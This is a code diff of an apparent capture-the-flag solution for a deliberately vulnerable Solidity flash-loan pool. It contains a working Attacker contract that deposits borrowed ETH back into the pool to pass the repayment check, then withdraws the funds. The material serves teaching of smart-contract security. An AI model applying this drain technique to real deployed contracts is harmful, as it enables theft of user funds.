@@ -33,30 +33,41 @@ contract SideEntranceLenderPool {
     }
 
     function flashLoan(uint256 amount) external {
-        uint256 balanceBefore = address(this).balance;
+        uint256 balanceBefore = address(this).balance; // balance of contract before flashloan
 
-        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}(); //sending amount requested to IFlashLoanEtherReceiver
         //msg.sender is an attacker contract so IFlashLoanEtherReceiver will be an attacker with execute function
 
-        if (address(this).balance < balanceBefore) {
+        if (address(this).balance < balanceBefore) { // amount after shoul be greater than before
             revert RepayFailed();
         }
     }
 }
 
 
-contract Attacker {
+contract Attacker is IFlashLoanEtherReceiver{
     SideEntranceLenderPool immutable pool;
     address recovery;
+    uint256 exploitAmount;
     
-    constructor(SideEntranceLenderPool _pool, address _recovery, uint256 amount) {
+    constructor(SideEntranceLenderPool _pool, address _recovery, uint256 _amount) {
         pool = _pool;
         recovery = _recovery;
-        pool.flashLoan(amount);
+        exploitAmount = _amount;
     }
 
-    function execute() external payable{
-        SafeTransferLib.safeTransferETH(recovery, pool.balances(address(pool)));
+    function execute() external payable override{
+        pool.deposit{value: msg.value}(); // pool.balance(attacker) = 1000
     } 
+
+    function attack() external returns(bool){
+        pool.flashLoan(exploitAmount);
+        pool.withdraw();
+        payable(recovery).transfer(exploitAmount);
+        return true;
+    }
+
+    receive() external payable{} // for the attacker to receive ETH on withdraw
+
 }
 
